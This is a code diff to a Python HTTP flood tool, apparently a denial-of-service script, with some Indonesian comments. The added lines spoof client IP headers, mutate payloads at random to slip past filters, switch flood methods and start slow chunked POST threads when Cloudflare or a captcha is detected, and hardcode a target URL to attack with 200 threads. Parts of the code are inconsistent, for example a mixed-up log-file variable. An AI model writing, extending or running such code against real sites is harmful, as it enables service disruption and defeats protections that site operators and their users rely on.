@@ -75,6 +75,8 @@ def inject_headers():
         "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}",
         "Accept-Language": random.choice(["en-US,en;q=0.9", "id-ID,id;q=0.8", "en-GB,en;q=0.7"])
     }
+    headers["X-Request-Timestamp"] = str(int(time.time()))
+    headers["X-Timezone"] = random.choice(["UTC", "GMT+7", "PST", "EST"])
     if bypass_header:
         headers["X-Originating-IP"] = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
         headers["X-Forwarded-Host"] = target
@@ -149,6 +151,18 @@ def mutate_payload(payload_type):
         return data
     else:
         return json.dumps({"error": "unknown payload type"})
+
+def smart_mutate(base_payload):
+    mutations = [
+        lambda p: p.replace("A", random.choice("XYZabc123")),
+        lambda p: p[::-1],
+        lambda p: p.upper(),
+        lambda p: p + str(os.urandom(random.randint(10, 50))),
+        lambda p: base64.b64encode(p.encode()).decode()
+    ]
+    for mut in random.sample(mutations, k=random.randint(2, 4)):
+        base_payload = mut(base_payload)
+    return base_payload
 
 def cycle_session():
     try:
@@ -227,6 +241,12 @@ def rotate_tls_context():
 
 def analyze_bypass(status_code, response_text):
     try:
+        if "cloudflare" in response_text.lower():
+            flood_method = "PATCH"
+            delay = 0.02
+        if "captcha" in response_text.lower():
+            threading.Thread(target=slow_chunked_post, args=(parsed_url.hostname,)).start()
+
         if "cpatha" in response_text.lower():
             print(f"{ANSI_RED}[!] CPATHA Detected{ANSI_RESET}")
         else:
@@ -315,7 +335,7 @@ def launch_ghost_sequence():
     print(f"Flood Method: {flood_method}")
     print(f"Failover Monitoring : { 'Enabled' if failover_monitoring else 'Disabled' }")
     print(f"Silent Mode : { 'Enabled' if silent_mode else 'Disabled' }")
-    print(f"Log File   : {log_file_path if log_file_path else 'None'}")
+    print(f"Log File   : {log_file_path if log_file else 'None'}")
 
     load_user_agents(ua_file)
 
@@ -331,8 +351,10 @@ def launch_ghost_sequence():
                 conn = http.client.HTTPSConnection(parsed_url.hostname, context=thread_local.tls_ctx)
                 paths = ["/", "/ping", "/admin", "/admin/login", "/?debug", "/v1/chain"]
                 chain_path = random.choice(paths)
-                payload_data = mutate_payload(payload_type)
-                method = random.choice(["POST", "PUT", "PATCH", "POST", "HEAD"])
+                payload_data = smart_mutate(mutate_payload(payload_type))
+                method = random.choice(["POST", "PUT", "PATCH", "OPTIONS", "XDEBUG", "BREACH"])
+                if random.random() < 0.3:
+                    local_headers = get_thread_headers()
                 conn.request(method, chain_path, payload_data, local_headers)
                 start_time = time.time()
                 response = conn.getresponse()
@@ -346,6 +368,8 @@ def launch_ghost_sequence():
                         stop_event.set()
                         break
                     time.sleep(delay + random.uniform(0.2, 1.0))
+                if time.time() % 8 > 5:
+                    time.sleep(2.5)  # Delay burst cooldown
             except Exception as e:
                 if log_file:
                     with open(log_file, 'a') as f:
@@ -428,7 +452,14 @@ def print_banner_brutal():
     """)
 
 if __name__ == "__main__":
-    args = parse_args()  # Pastikan ini di atas semua pemanggilan argumen
+    args = argparse.Namespace(
+        target="https://realtarget.com",
+        fire=True,
+        threads=200,
+        silent=False,
+        dashboard=True,
+        stealth_force=False
+    )
 
     if args.target:
         target = args.target
@@ -438,6 +469,7 @@ if __name__ == "__main__":
         parsed_url = urlparse(target)
     else:
         print(f"{ANSI_RED}[ERROR] --target required unless --fire or --stealth-force with fallback{ANSI_RESET}")
+        print("Example usage: python script.py --target https://example.com --threads 200 --fire")
         exit()
 
     if not log_file_path:
